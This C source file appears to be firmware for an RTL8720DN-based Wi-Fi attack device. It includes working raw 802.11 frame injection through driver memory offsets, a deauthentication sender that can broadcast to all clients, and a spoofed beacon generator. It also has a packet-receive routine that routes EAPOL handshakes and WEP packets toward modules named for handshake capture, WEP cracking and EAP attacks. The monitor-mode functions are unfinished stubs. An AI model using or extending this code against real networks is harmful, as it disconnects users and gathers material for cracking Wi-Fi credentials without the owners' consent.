#include "wifi_cust_tx.h"
#include "wifi_handshake_capture.h"
#include "wifi_wep_crack.h"
#include "wifi_eap_attack.h"

/*
 * Transmits a raw 802.11 frame with a given length.
 * The frame must be valid and have a sequence number of 0 as it will be set automatically.
 * The frame check sequence is added automatically and must not be included in the length.
 * @param frame A pointer to the raw frame
 * @param size The size of the frame
*/
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

/*
 * Transmits a 802.11 deauth frame on the active channel
 * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
 * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the deauth
 * @param reason A reason code according to the 802.11 spec. Optional 
*/
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

/*
 * Transmits a very basic 802.11 beacon with the given ssid on the active channel
 * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
 * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the beacon
 * @param ssid '\0' terminated array of characters representing the SSID
*/
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
  BeaconFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  for (int i = 0; ssid[i] != '\0'; i++) {
    frame.ssid[i] = ssid[i];
    frame.ssid_length++;
  }
  wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
}

// WiFi帧接收相关实现
static wifi_rx_callback_t rx_callback = nullptr;
static wep_packet_callback_t wep_callback = nullptr;
static eap_packet_callback_t eap_callback = nullptr;
static bool rx_monitoring = false;

// 初始化WiFi接收
void wifi_rx_init() {
    rx_monitoring = false;
    rx_callback = nullptr;
    wep_callback = nullptr;
    eap_callback = nullptr;
}

// 开始监控模式
void wifi_rx_start_monitor() {
    if (rx_monitoring) {
        return;
    }
    
    // 设置WiFi为监控模式
    // 注意：这需要调用RTL8720DN的底层API
    // 具体实现可能需要根据实际的SDK进行调整
    
    rx_monitoring = true;
    DEBUG_SER_PRINT("WiFi monitor mode started\n");
}

// 停止监控模式
void wifi_rx_stop_monitor() {
    if (!rx_monitoring) {
        return;
    }
    
    rx_monitoring = false;
    DEBUG_SER_PRINT("WiFi monitor mode stopped\n");
}

// 检查是否在监控模式
bool wifi_rx_is_monitoring() {
    return rx_monitoring;
}

// 处理接收到的数据包
void wifi_rx_process_packet(const uint8_t* packet, size_t length) {
    if (!rx_monitoring || !packet || length < WIFI_FRAME_MIN_LENGTH) {
        return;
    }

    // 解析802.11帧
    WiFiFrameInfo frame_info;
    if (!parse_wifi_frame(packet, length, &frame_info)) {
        return;
    }

    // 提取MAC地址
    uint8_t src_mac[6], dst_mac[6], bssid[6];
    extract_mac_addresses(packet, length, src_mac, dst_mac, bssid);
    
    // 按优先级处理不同类型的包
    // 1. 先处理EAPOL包（包含握手包和EAP）
    if (is_eapol_frame(packet, length)) {
        if (process_eapol_packet(packet, length, src_mac, dst_mac)) {
            return; // EAPOL包已处理完成
        }
    }
    
    // 2. 再处理WEP包
    if (is_wep_encrypted_frame(packet, length)) {
        if (process_wep_packet(packet, length, src_mac, dst_mac)) {
            return; // WEP包已处理完成
        }
    }
    
    // 3. 最后处理其他包
    if (rx_callback) {
        rx_callback(packet, length, src_mac, dst_mac);
    }
}

// 设置接收回调函数
void wifi_rx_set_callback(wifi_rx_callback_t callback) {
    rx_callback = callback;
}

// 设置WEP数据包处理回调函数
void wifi_rx_set_wep_callback(wep_packet_callback_t callback) {
    wep_callback = callback;
}

// 设置EAP数据包处理回调函数
void wifi_rx_set_eap_callback(eap_packet_callback_t callback) {
    eap_callback = callback;
}